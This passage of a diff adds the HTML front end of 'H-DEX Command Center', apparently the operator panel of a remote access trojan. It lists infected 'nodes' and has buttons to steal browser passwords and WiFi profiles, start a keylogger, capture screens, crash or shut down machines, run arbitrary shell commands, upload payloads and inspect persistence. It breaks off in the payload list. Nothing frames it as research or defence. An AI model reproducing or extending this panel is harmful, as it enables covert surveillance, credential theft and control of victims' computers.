@@ -1,0 +1,2007 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>H-DEX Command Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.28/jspdf.plugin.autotable.min.js"></script>
+    <style>
+        * {
+            font-family: 'Inter', sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        :root {
+            --bg-primary: #000000;
+            --bg-secondary: #050505;
+            --bg-card: #0a0a0a;
+            --accent: #3b82f6;
+            --accent-hover: #2563eb;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --text-primary: #ffffff;
+            --text-secondary: #a1a1aa;
+            --border: #1a1a1a;
+            --sidebar-width: 260px;
+        }
+
+        body {
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            overflow: hidden;
+        }
+
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+        }
+
+        .sidebar {
+            background: var(--bg-secondary);
+            border-right: 1px solid var(--border);
+            width: var(--sidebar-width);
+        }
+
+        .nav-item {
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            border-radius: 6px;
+            color: var(--text-secondary);
+        }
+
+        .nav-item:hover {
+            color: var(--text-primary);
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .nav-item.active {
+            background: var(--accent);
+            color: white;
+        }
+
+        .stat-card {
+            background: linear-gradient(145deg, #0a0a0a 0%, #050505 100%);
+        }
+
+        .device-card {
+            border-left: 3px solid transparent;
+        }
+
+        .device-card:hover {
+            border-color: var(--accent);
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .btn-primary {
+            background: var(--accent);
+            border-radius: 6px;
+        }
+
+        .btn-primary:hover {
+            background: var(--accent-hover);
+        }
+
+        .terminal-container {
+            background: #000;
+            border: 1px solid var(--border);
+            font-family: 'JetBrains Mono', 'Consolas', monospace;
+        }
+
+        .scrollbar-thin::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .scrollbar-thin::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .scrollbar-thin::-webkit-scrollbar-thumb {
+            background: #222;
+            border-radius: 2px;
+        }
+
+        .tab-content {
+            display: none;
+            animation: fadeIn 0.2s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(5px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .modal-blur {
+            backdrop-filter: blur(12px);
+            background: rgba(0, 0, 0, 0.7);
+        }
+    </style>
+</head>
+
+<body class="min-h-screen">
+    <!-- Login Modal -->
+    <div id="login-modal" class="fixed inset-0 bg-black flex items-center justify-center z-50">
+        <div
+            class="absolute inset-0 bg-[url('data:image/svg+xml,%3Csvg width=%2240%22 height=%2240%22 viewBox=%220 0 40 40%22 xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cpath d=%22M0 0h1v1H0V0zm1 1h1v1H1V1zm1 1h1v1H2V2zm1 1h1v1H3V3z%22 fill=%22%23111%22 fill-opacity=%220.4%22/%3E%3C/svg%3E')] opacity-20">
+        </div>
+        <div class="card p-10 w-full max-w-sm relative z-10 border-neutral-800 bg-neutral-900/40 backdrop-blur-md">
+            <div class="text-center mb-8">
+                <img src="logo.png" alt="H-Dex" class="w-24 h-auto mx-auto mb-6">
+                <h1 class="text-2xl font-semibold tracking-tight">Access Restricted</h1>
+                <p class="text-neutral-500 mt-2 text-sm uppercase tracking-widest text-xs">Administrative Login</p>
+            </div>
+            <div class="space-y-6">
+                <div class="relative">
+                    <input type="password" id="token-input" placeholder="Secure Access Token"
+                        class="w-full px-4 py-3 bg-black border border-neutral-800 rounded-lg focus:outline-none focus:border-blue-500 transition-all text-center tracking-tighter">
+                </div>
+                <button onclick="authenticate()" class="btn-primary w-full py-3 rounded-lg font-medium transition-all">
+                    Unlock System
+                </button>
+                <div
+                    class="flex items-center justify-center gap-4 text-[10px] text-neutral-600 uppercase tracking-widest">
+                    <span>AES-256</span>
+                    <span class="w-1 h-1 bg-neutral-800 rounded-full"></span>
+                    <span>TLS 1.3</span>
+                    <span class="w-1 h-1 bg-neutral-800 rounded-full"></span>
+                    <span>H-DEX v5.0</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Layout -->
+    <div id="main-app" class="hidden flex h-screen">
+        <!-- Sidebar -->
+        <aside class="sidebar flex flex-col">
+            <div class="px-6 py-8">
+                <div class="flex items-center gap-3">
+                    <div class="w-8 h-8 bg-blue-600 rounded flex items-center justify-center font-bold text-white">H
+                    </div>
+                    <div>
+                        <h1 class="font-bold tracking-tight text-lg">H-DEX <span class="text-blue-500">ULTRA</span></h1>
+                        <p class="text-[10px] text-neutral-500 uppercase tracking-widest leading-none">Management
+                            Console</p>
+                    </div>
+                </div>
+            </div>
+
+            <nav class="flex-1 px-4 space-y-1 overflow-y-auto scrollbar-thin">
+                <div class="px-2 text-[10px] text-neutral-600 uppercase tracking-widest font-bold mb-4">Operations</div>
+                <a onclick="switchTab('dashboard')"
+                    class="nav-item active flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm"
+                    data-tab="dashboard">
+                    <i class="fas fa-grid-2 text-xs"></i>Dashboard
+                </a>
+                <a onclick="switchTab('devices')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="devices">
+                    <i class="fas fa-desktop text-xs"></i>Devices
+                    <span class="ml-auto text-[10px] bg-neutral-800 text-neutral-400 px-1.5 py-0.5 rounded"
+                        id="nav-device-count">0</span>
+                </a>
+                <a onclick="switchTab('terminal')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="terminal">
+                    <i class="fas fa-terminal text-xs"></i>Live Terminal
+                </a>
+                <a onclick="switchTab('files')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="files">
+                    <i class="fas fa-folder text-xs"></i>File Manager
+                </a>
+                <a onclick="switchTab('payloads')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="payloads">
+                    <i class="fas fa-box text-xs"></i>Payload Manager
+                </a>
+                <a onclick="switchTab('processes')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="processes">
+                    <i class="fas fa-tasks text-xs"></i>Task Manager
+                </a>
+                <a onclick="switchTab('services')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="services">
+                    <i class="fas fa-cogs text-xs"></i>Services
+                </a>
+                <a onclick="switchTab('startup')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="startup">
+                    <i class="fas fa-play-circle text-xs"></i>Startup Depot
+                </a>
+
+                <div class="px-2 text-[10px] text-neutral-600 uppercase tracking-widest font-bold mb-4 mt-8">
+                    Intelligence</div>
+                <a onclick="switchTab('vault')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="vault">
+                    <i class="fas fa-database text-xs"></i>Data Vault
+                </a>
+                <a onclick="switchTab('screenshots')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="screenshots">
+                    <i class="fas fa-images text-xs"></i>Screenshots
+                </a>
+                <a onclick="switchTab('activity')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="activity">
+                    <i class="fas fa-list-ul text-xs"></i>Event Log
+                </a>
+                <a onclick="switchTab('identity')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="identity">
+                    <i class="fas fa-user-secret text-xs"></i>Identity Hunter
+                </a>
+
+                <div class="px-2 text-[10px] text-neutral-600 uppercase tracking-widest font-bold mb-4 mt-8">System
+                </div>
+                <a onclick="switchTab('blacklist')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="blacklist">
+                    <i class="fas fa-shield-slash text-xs"></i>Security & Bans
+                </a>
+                <a onclick="switchTab('settings')"
+                    class="nav-item flex items-center gap-3 px-3 py-2.5 cursor-pointer text-sm" data-tab="settings">
+                    <i class="fas fa-sliders text-xs"></i>Configuration
+                </a>
+            </nav>
+
+            <div class="p-6 border-t border-neutral-900">
+                <div class="flex items-center justify-between mb-4">
+                    <div class="flex items-center gap-2">
+                        <span class="w-1.5 h-1.5 bg-success rounded-full"></span>
+                        <span class="text-[10px] uppercase font-bold tracking-widest">Active</span>
+                    </div>
+                    <span class="text-[10px] text-neutral-600" id="server-uptime">--</span>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="flex-1 overflow-auto scrollbar-thin bg-[#000]">
+            <!-- Header -->
+            <header
+                class="sticky top-0 bg-black/60 backdrop-blur-md border-b border-neutral-900 px-8 py-5 z-20 flex items-center justify-between">
+                <div>
+                    <h2 class="text-sm font-bold uppercase tracking-[0.2em] text-neutral-400" id="page-title">Dashboard
+                    </h2>
+                    <div class="flex items-center gap-2 mt-1">
+                        <p class="text-[10px] text-neutral-600 uppercase tracking-widest" id="page-subtitle">Real-time
+                            infrastructure intelligence</p>
+                        <div id="breadcrumb" class="hidden flex items-center gap-2">
+                            <span class="text-[8px] text-neutral-800 font-bold tracking-widest">//</span>
+                            <span class="text-[10px] text-blue-500 font-mono font-bold tracking-tighter"
+                                id="breadcrumb-node">--</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="flex items-center gap-3">
+                    <div
+                        class="flex items-center gap-2 px-3 py-1.5 bg-neutral-900 rounded-md border border-neutral-800 mr-4">
+                        <i class="fas fa-circle text-[6px] text-success"></i>
+                        <span class="text-[10px] font-bold text-neutral-400 uppercase tracking-widest"
+                            id="ws-status">Connecting</span>
+                    </div>
+                    <button onclick="refreshAll()"
+                        class="p-2 hover:bg-neutral-900 rounded-md transition text-neutral-400">
+                        <i class="fas fa-rotate text-sm"></i>
+                    </button>
+                    <button onclick="logout()" class="p-2 hover:bg-red-500/10 text-red-500 rounded-md transition ml-2">
+                        <i class="fas fa-power-off text-sm"></i>
+                    </button>
+                </div>
+            </header>
+
+            <div class="p-6">
+                <!-- Dashboard Tab -->
+                <div id="tab-dashboard" class="tab-content active space-y-8">
+                    <!-- Stats Grid -->
+                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+                        <div class="card p-6 stat-card">
+                            <div class="flex items-center justify-between mb-2">
+                                <span class="text-[10px] text-neutral-500 uppercase tracking-widest font-bold">Total
+                                    Clients</span>
+                                <i class="fas fa-desktop text-neutral-700 text-xs"></i>
+                            </div>
+                            <div class="text-3xl font-bold tracking-tighter" id="stat-devices">0</div>
+                            <div
+                                class="text-[10px] text-neutral-600 mt-2 italic border-t border-neutral-900/50 pt-2 uppercase tracking-tighter">
+                                Active Nodes</div>
+                        </div>
+                        <div class="card p-6 stat-card">
+                            <div class="flex items-center justify-between mb-2">
+                                <span class="text-[10px] text-neutral-500 uppercase tracking-widest font-bold">Network
+                                    Traffic</span>
+                                <i class="fas fa-signal-stream text-neutral-700 text-xs"></i>
+                            </div>
+                            <div class="text-3xl font-bold tracking-tighter" id="stat-messages">0</div>
+                            <div
+                                class="text-[10px] text-neutral-600 mt-2 italic border-t border-neutral-900/50 pt-2 uppercase tracking-tighter">
+                                Total Packets</div>
+                        </div>
+                        <div class="card p-6 stat-card">
+                            <div class="flex items-center justify-between mb-2">
+                                <span class="text-[10px] text-neutral-500 uppercase tracking-widest font-bold">Peak
+                                    Concurrency</span>
+                                <i class="fas fa-chart-line text-neutral-700 text-xs"></i>
+                            </div>
+                            <div class="text-3xl font-bold tracking-tighter" id="stat-peak">0</div>
+                            <div
+                                class="text-[10px] text-neutral-600 mt-2 italic border-t border-neutral-900/50 pt-2 uppercase tracking-tighter">
+                                Session Max</div>
+                        </div>
+                        <div class="card p-6 stat-card">
+                            <div class="flex items-center justify-between mb-2">
+                                <span class="text-[10px] text-neutral-500 uppercase tracking-widest font-bold">Data
+                                    Vault</span>
+                                <i class="fas fa-database text-neutral-700 text-xs"></i>
+                            </div>
+                            <div class="text-3xl font-bold tracking-tighter" id="stat-db">0 MB</div>
+                            <div
+                                class="text-[10px] text-neutral-600 mt-2 italic border-t border-neutral-900/50 pt-2 uppercase tracking-tighter">
+                                Database Size</div>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                        <div class="lg:col-span-2 space-y-6">
+                            <div class="card overflow-hidden">
+                                <div
+                                    class="px-6 py-4 border-b border-neutral-900 flex items-center justify-between bg-neutral-900/20">
+                                    <h3 class="text-[10px] font-bold uppercase tracking-widest text-neutral-400">
+                                        Connected Device Preview</h3>
+                                    <button onclick="switchTab('devices')"
+                                        class="text-[10px] text-blue-500 font-bold uppercase tracking-widest hover:text-blue-400 transition-colors">View
+                                        All Devices</button>
+                                </div>
+                                <div id="devices-preview"
+                                    class="grid grid-cols-1 md:grid-cols-2 gap-px bg-neutral-900/40">
+                                    <!-- Device cards will go here -->
+                                    <p
+                                        class="p-8 text-center text-xs text-neutral-600 italic col-span-full uppercase tracking-widest">
+                                        Scanning for nodes...</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="space-y-6">
+                            <div class="card px-6 py-6">
+                                <h3
+                                    class="text-[10px] font-bold uppercase tracking-widest mb-6 border-b border-neutral-900 pb-4 text-neutral-400">
+                                    System Integrity</h3>
+                                <div class="space-y-5">
+                                    <div class="flex items-center justify-between">
+                                        <div class="space-y-0.5">
+                                            <p class="text-xs font-medium">Master Kill-Switch</p>
+                                            <p class="text-[10px] text-neutral-600 uppercase tracking-tighter">Emergency
+                                                Disconnect</p>
+                                        </div>
+                                        <label class="relative inline-flex items-center cursor-pointer">
+                                            <input type="checkbox" id="kill-switch-dash"
+                                                onchange="toggleKillSwitch(this.checked)" class="sr-only peer">
+                                            <div
+                                                class="w-10 h-5 bg-neutral-800 rounded-full peer peer-checked:bg-red-600 after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:after:translate-x-5">
+                                            </div>
+                                        </label>
+                                    </div>
+                                    <div class="pt-2">
+                                        <div class="flex justify-between text-[10px] py-1.5 ">
+                                            <span class="text-neutral-500 uppercase tracking-widest">Memory
+                                                Allocation</span>
+                                            <span class="info-ram font-mono text-neutral-400">--</span>
+                                        </div>
+                                        <div class="flex justify-between text-[10px] py-1.5 ">
+                                            <span class="text-neutral-500 uppercase tracking-widest">Processor
+                                                Payload</span>
+                                            <span class="info-cpu font-mono text-neutral-400">--</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="card overflow-hidden">
+                                <div class="px-6 py-4 border-b border-neutral-900 bg-neutral-900/20">
+                                    <h3 class="text-[10px] font-bold uppercase tracking-widest text-neutral-400">Live
+                                        Activity Feed</h3>
+                                </div>
+                                <div id="recent-activity"
+                                    class="max-h-64 overflow-y-auto scrollbar-thin divide-y divide-neutral-900/50">
+                                    <p
+                                        class="p-8 text-center text-[10px] text-neutral-600 uppercase tracking-widest italic">
+                                        Monitoring Operations...</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Devices Tab -->
+                <div id="tab-devices" class="tab-content space-y-8">
+                    <div class="flex items-center justify-between">
+                        <div
+                            class="flex items-center gap-4 bg-neutral-900/60 p-1 rounded-lg border border-neutral-800 w-full max-w-xl">
+                            <i class="fas fa-search text-neutral-600 ml-3 text-xs"></i>
+                            <input type="text" id="device-search" placeholder="Filter by Node ID, IP, or Hostname..."
+                                onkeyup="filterDevices()"
+                                class="bg-transparent border-none focus:ring-0 text-xs w-full py-2 placeholder-neutral-700 uppercase tracking-tighter">
+                        </div>
+                        <div class="flex gap-2">
+                            <button onclick="exportDevicesPDF()"
+                                class="px-4 py-2 bg-blue-600 rounded text-[10px] font-bold uppercase tracking-widest hover:bg-blue-500 transition-all">Export
+                                Report (PDF)</button>
+                            <button onclick="refreshAll()"
+                                class="px-4 py-2 bg-neutral-900 border border-neutral-800 rounded text-[10px] font-bold uppercase tracking-widest hover:bg-neutral-800 transition-all">Scan
+                                Network</button>
+                        </div>
+                    </div>
+
+                    <div id="devices-list" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
+                        <!-- Full list of device cards -->
+                        <div class="card p-8 text-center col-span-full border-dashed border-neutral-800">
+                            <p class="text-[10px] text-neutral-600 uppercase tracking-[0.2em]">Awaiting inbound
+                                connections...</p>
+                        </div>
+                    </div>
+
+                    <!-- Command Center (Visible when device selected) -->
+                    <div id="device-controls" class="hidden animate-in fade-in slide-in-from-bottom-4 duration-300">
+                        <div class="card overflow-hidden">
+                            <div
+                                class="px-6 py-4 border-b border-neutral-900 bg-neutral-900/20 flex items-center justify-between">
+                                <h3 class="text-[10px] font-bold uppercase tracking-widest text-neutral-400">Node
+                                    Command Center: <span id="active-device-id" class="text-blue-500">--</span></h3>
+                                <button onclick="deselectDevice()"
+                                    class="text-neutral-500 hover:text-white transition-colors"><i
+                                        class="fas fa-times"></i></button>
+                            </div>
+                            <div class="p-8 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-3">
+                                <button onclick="sendCommand('take_screenshot')" class="cmd-btn">
+                                    <i class="fas fa-camera text-blue-500"></i>
+                                    <span>Capture Screen</span>
+                                </button>
+                                <button onclick="switchTab('processes', selectedDeviceId)" class="cmd-btn">
+                                    <i class="fas fa-tasks text-neutral-400"></i>
+                                    <span>Task Manager</span>
+                                </button>
+                                <button onclick="sendCommand('get_sys_info')" class="cmd-btn">
+                                    <i class="fas fa-info-circle text-neutral-400"></i>
+                                    <span>System Data</span>
+                                </button>
+                                <button onclick="sendCommand('get_wifi')" class="cmd-btn">
+                                    <i class="fas fa-wifi text-neutral-400"></i>
+                                    <span>WiFi Profiles</span>
+                                </button>
+                                <button onclick="sendCommand('get_browser_passwords')" class="cmd-btn">
+                                    <i class="fas fa-key text-neutral-400"></i>
+                                    <span>Credentials</span>
+                                </button>
+                                <button onclick="sendCommand('start_keylogger')" class="cmd-btn">
+                                    <i class="fas fa-keyboard text-neutral-400"></i>
+                                    <span>Engage Keylog</span>
+                                </button>
+                                <button onclick="sendCommand('stop_keylogger')" class="cmd-btn">
+                                    <i class="fas fa-keyboard-slash text-neutral-600"></i>
+                                    <span>Disengage</span>
+                                </button>
+                            </div>
+
+                            <div class="px-8 pb-8 border-t border-neutral-900 pt-6">
+                                <p class="text-[10px] text-neutral-600 uppercase tracking-widest font-bold mb-4">Core
+                                    Management</p>
+                                <div class="grid grid-cols-2 lg:grid-cols-4 gap-3">
+                                    <button onclick="sendCommand('power_action', { action: 'lock' })"
+                                        class="p-4 bg-neutral-900/40 rounded border border-neutral-800 hover:bg-neutral-800 transition-all text-left group">
+                                        <i class="fas fa-lock text-neutral-500 mb-2 group-hover:text-blue-500"></i>
+                                        <p class="text-[10px] font-bold uppercase text-neutral-400">Lock</p>
+                                    </button>
+                                    <button onclick="sendCommand('power_action', { action: 'restart' })"
+                                        class="p-4 bg-neutral-900/40 rounded border border-neutral-800 hover:bg-neutral-800 transition-all text-left group">
+                                        <i class="fas fa-undo text-neutral-500 mb-2 group-hover:text-amber-500"></i>
+                                        <p class="text-[10px] font-bold uppercase text-neutral-400">Restart</p>
+                                    </button>
+                                    <button onclick="sendCommand('power_action', { action: 'shutdown' })"
+                                        class="p-4 bg-neutral-900/40 rounded border border-neutral-800 hover:bg-neutral-800 transition-all text-left group">
+                                        <i class="fas fa-power-off text-neutral-500 mb-2 group-hover:text-red-500"></i>
+                                        <p class="text-[10px] font-bold uppercase text-neutral-400">Shutdown</p>
+                                    </button>
+                                    <button onclick="sendCommand('bsod')"
+                                        class="p-4 bg-neutral-900/40 rounded border border-neutral-800 hover:bg-neutral-800 transition-all text-left group">
+                                        <i
+                                            class="fas fa-skull-crossbones text-neutral-500 mb-2 group-hover:text-purple-500"></i>
+                                        <p class="text-[10px] font-bold uppercase text-neutral-400">Fatal Err</p>
+                                    </button>
+                                </div>
+                            </div>
+
+                            <div class="px-8 pb-8 border-t border-neutral-900 pt-6">
+                                <p class="text-[10px] text-neutral-600 uppercase tracking-widest font-bold mb-4">
+                                    Environment Interaction</p>
+                                <div class="flex items-center gap-3">
+                                    <div
+                                        class="flex-1 bg-neutral-900/60 rounded border border-neutral-800 px-4 py-2 flex items-center gap-3">
+                                        <i class="fas fa-volume-up text-neutral-600 text-[10px]"></i>
+                                        <input type="text" id="tts-input" placeholder="Transmit Voice of H-Dex (TTS)..."
+                                            class="bg-transparent border-none focus:ring-0 text-[10px] w-full p-0 placeholder-neutral-800 uppercase tracking-widest">
+                                    </div>
+                                    <button onclick="sendTTS()"
+                                        class="px-6 py-2 bg-neutral-800 border border-neutral-700 rounded text-[10px] font-bold uppercase tracking-widest hover:bg-neutral-700 transition-all">Speak</button>
+                                </div>
+                            </div>
+
+                            <div class="px-8 pb-8 border-t border-neutral-900 pt-6">
+                                <p class="text-[10px] text-neutral-600 uppercase tracking-widest font-bold mb-4">
+                                    Environment Pranks</p>
+                                <div class="grid grid-cols-2 lg:grid-cols-4 gap-3">
+                                    <button onclick="sendCommand('fake_update')"
+                                        class="p-3 bg-neutral-950 rounded border border-neutral-900 hover:bg-neutral-900 transition-all text-center group">
+                                        <i class="fas fa-sync-alt text-neutral-600 mb-2 group-hover:text-blue-500"></i>
+                                        <p class="text-[8px] font-bold uppercase text-neutral-500">Update Prank</p>
+                                    </button>
+                                    <button onclick="sendCommand('crazy_mouse')"
+                                        class="p-3 bg-neutral-950 rounded border border-neutral-900 hover:bg-neutral-900 transition-all text-center group">
+                                        <i
+                                            class="fas fa-mouse-pointer text-neutral-600 mb-2 group-hover:text-amber-500"></i>
+                                        <p class="text-[8px] font-bold uppercase text-neutral-500">Crazy Mouse</p>
+                                    </button>
+                                    <button onclick="sendCommand('monitor_off')"
+                                        class="p-3 bg-neutral-950 rounded border border-neutral-900 hover:bg-neutral-900 transition-all text-center group">
+                                        <i class="fas fa-tv text-neutral-600 mb-2 group-hover:text-red-500"></i>
+                                        <p class="text-[8px] font-bold uppercase text-neutral-500">Mon Off</p>
+                                    </button>
+                                    <button
+                                        onclick="sendCommand('spam_message_box', { text: 'CRITICAL SYSTEM FAILURE: HOST HAS BEEN REQUISITIONED' })"
+                                        class="p-3 bg-neutral-950 rounded border border-neutral-900 hover:bg-neutral-900 transition-all text-center group">
+                                        <i
+                                            class="fas fa-exclamation-triangle text-neutral-600 mb-2 group-hover:text-purple-500"></i>
+                                        <p class="text-[8px] font-bold uppercase text-neutral-500">Spam Boxes</p>
+                                    </button>
+                                </div>
+                            </div>
+
+                            <div class="px-8 pb-8 border-t border-neutral-900 pt-6">
+                                <div class="flex items-center gap-3">
+                                    <div
+                                        class="flex-1 bg-neutral-900/60 rounded border border-neutral-800 px-4 py-2 flex items-center gap-3">
+                                        <span class="text-neutral-600 font-mono text-xs">$</span>
+                                        <input type="text" id="custom-cmd" placeholder="Execute direct shell command..."
+                                            class="bg-transparent border-none focus:ring-0 text-xs w-full p-0 font-mono placeholder-neutral-800">
+                                    </div>
+                                    <button onclick="sendShellCommand()"
+                                        class="px-6 py-2 bg-blue-600 rounded text-[10px] font-bold uppercase tracking-widest hover:bg-blue-500 transition-all">Execute</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Task Manager Tab -->
+                <div id="tab-processes" class="tab-content space-y-6">
+                    <div class="flex items-center justify-between">
+                        <div class="flex gap-2">
+                            <button onclick="loadProcesses()"
+                                class="px-4 py-2 bg-blue-600 rounded text-[10px] font-bold uppercase tracking-widest hover:bg-blue-500 transition-all shadow-lg shadow-blue-900/20">
+                                <i class="fas fa-sync-alt mr-2"></i>Refresh Processes
+                            </button>
+                            <span
+                                class="px-4 py-2 bg-neutral-900 border border-neutral-800 rounded text-[10px] font-bold uppercase tracking-widest text-neutral-500 flex items-center">
+                                Active Node: <span id="current-process-node" class="ml-2 text-white">NONE</span>
+                            </span>
+                        </div>
+                        <div
+                            class="flex items-center gap-4 bg-neutral-900/40 p-1 rounded-lg border border-neutral-800 w-full max-w-xs">
+                            <i class="fas fa-search text-neutral-600 ml-3 text-[10px]"></i>
+                            <input type="text" id="process-search" placeholder="Filter processes..."
+                                onkeyup="filterProcesses()"
+                                class="bg-transparent border-none focus:ring-0 text-[10px] w-full py-1.5 placeholder-neutral-700 uppercase tracking-widest">
+                        </div>
+                    </div>
+                    <div class="card overflow-hidden">
+                        <div class="max-h-[600px] overflow-y-auto scrollbar-thin">
+                            <table class="w-full text-left border-collapse">
+                                <thead class="sticky top-0 z-10">
+                                    <tr class="bg-neutral-900 border-b border-neutral-800">
+                                        <th
+                                            class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                            PID</th>
+                                        <th
+                                            class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                            Image Name</th>
+                                        <th
+                                            class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest text-right">
+                                            Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="process-table" class="divide-y divide-neutral-900/50">
+                                    <tr>
+                                        <td colspan="3"
+                                            class="px-6 py-12 text-center text-[10px] text-neutral-600 uppercase tracking-[0.2em] italic">
+                                            Select a device to enumerate active processes...</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Services Tab -->
+                <div id="tab-services" class="tab-content space-y-6">
+                    <div class="flex items-center justify-between">
+                        <button onclick="loadServices()"
+                            class="px-4 py-2 bg-blue-600 rounded text-[10px] font-bold uppercase tracking-widest hover:bg-blue-500 transition-all">
+                            Refresh Services
+                        </button>
+                        <input type="text" id="service-search" placeholder="Filter services..."
+                            onkeyup="filterServices()"
+                            class="bg-neutral-900 border border-neutral-800 rounded px-4 py-2 text-[10px] w-64 focus:outline-none focus:border-blue-500">
+                    </div>
+                    <div class="card overflow-hidden">
+                        <div class="max-h-[600px] overflow-y-auto scrollbar-thin">
+                            <table class="w-full text-left">
+                                <thead class="sticky top-0 bg-neutral-900 z-10 border-b border-neutral-800">
+                                    <tr>
+                                        <th
+                                            class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                            Service Name</th>
+                                        <th
+                                            class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                            Status</th>
+                                        <th
+                                            class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest text-right">
+                                            Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="service-table" class="divide-y divide-neutral-900/50">
+                                    <tr>
+                                        <td colspan="3"
+                                            class="px-6 py-12 text-center text-[10px] text-neutral-600 italic">Select
+                                            node in Fleet tab</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Startup Depot Tab -->
+                <div id="tab-startup" class="tab-content space-y-6">
+                    <div class="flex items-center justify-between">
+                        <button onclick="loadStartup()"
+                            class="px-4 py-2 bg-blue-600 rounded text-[10px] font-bold uppercase tracking-widest hover:bg-blue-500 transition-all">
+                            Scan Persistence
+                        </button>
+                    </div>
+                    <div class="card overflow-hidden">
+                        <table class="w-full text-left">
+                            <thead class="bg-neutral-900 border-b border-neutral-800">
+                                <tr>
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest">
+                                        Entry Path</th>
+                                    <th
+                                        class="px-6 py-4 text-[10px] font-bold text-neutral-500 uppercase tracking-widest text-right">
+                                        Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="startup-table" class="divide-y divide-neutral-900/50">
+                                <tr>
+                                    <td colspan="2" class="px-6 py-12 text-center text-[10px] text-neutral-600 italic">
+                                        Enumerate persistence via Fleet tab</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Payload Manager Tab -->
+                <div id="tab-payloads" class="tab-content space-y-8">
+                    <div class="flex items-center justify-between">
+                        <div>
+                            <h3 class="text-lg font-bold tracking-tight">Deployment Assets</h3>
+                            <p class="text-[10px] text-neutral-600 uppercase tracking-widest">Manage and distribute
+                                payloads</p>
+                        </div>
+                        <button onclick="document.getElementById('payload-upload').click()"
+                            class="px-5 py-2.5 bg-blue-600 rounded text-[10px] font-bold uppercase tracking-widest hover:bg-blue-500 transition-all shadow-lg shadow-blue-900/20">
+                            Upload Artifact
+                        </button>
+                        <input type="file" id="payload-upload" class="hidden" onchange="uploadPayload(this)">
+                    </div>
+
+                    <div id="payload-list" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                        <!-- Payloads will be listed here -->
+                        <div class="card p-12 text-center col-span-full border-dashed border-neutral-800">
+                            <i class="fas fa-box-open text-3xl text-neutral-800 mb-4"></i>
+                            <p class="text-[10px] text-neutral-600 uppercase tracking-[0.2em]">No deployment assets
